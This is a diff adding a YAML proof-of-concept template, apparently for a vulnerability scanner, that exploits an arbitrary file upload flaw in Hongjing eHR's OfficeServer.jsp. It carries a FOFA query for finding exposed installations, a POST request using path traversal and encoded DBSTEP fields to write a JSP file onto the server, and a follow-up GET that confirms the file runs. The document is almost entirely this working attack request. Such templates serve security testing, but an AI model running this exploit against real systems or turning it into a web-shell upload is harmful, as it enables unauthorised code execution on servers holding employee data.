@@ -1,0 +1,54 @@
+id: poc-yaml-hjsoft-ehr-officeserverjsp-anyfile-upload
+info:
+  name: 宏景eHR OfficeServer.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_str(6)
+  filename: base64("..\\" + t1 + ".jsp")
+  content: random_str(18)
+requests:
+- method: POST
+  path: /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp
+  data: 'DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
+
+    OPTION=U0FWRUZJTEU=
+
+    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+
+    FILETYPE={{.filename}}
+
+    RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+
+    originalFileId=wV66
+
+    originalCreateDate=wUghPB3szB3Xwg66
+
+    FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
+
+    needReadFile=yRWZdAS6
+
+    originalCreateDate=wLSGP4oEzLKAz4=iz=66
+
+
+    <%out.println("{{.content}}");%>
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"DBSTEP") &&
+
+    contains(headers,"text/html")
+
+    '
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
